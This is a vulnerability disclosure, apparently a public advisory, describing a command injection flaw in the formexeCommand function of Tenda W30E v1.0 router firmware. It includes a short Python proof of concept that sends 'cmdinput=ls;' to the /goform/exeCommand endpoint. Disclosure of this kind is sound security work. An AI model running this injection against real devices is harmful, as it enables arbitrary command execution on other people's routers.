## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware, we discovered a command injection vulnerablility in `formexeCommand` function in the `cmdinput` parameter and the `str` varable is assigned to `cmd_buf` variable, which is directly used in `doSystemCmd` function, causing an arbitrary command execution. The user-provided `cmdinput` can trigger this security vulnerability.

![image-20240409104740909](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104740909.png)

![image-20240409104757311](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104757311.png)

## POC

```python
import requests
IP = "192.168.84.102"
url = f"http://{IP}/goform/exeCommand"
data = "cmdinput=ls;"
ret = requests.post(url=url,data=data)
```

![image-20240407162830240](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240407162830240.png)
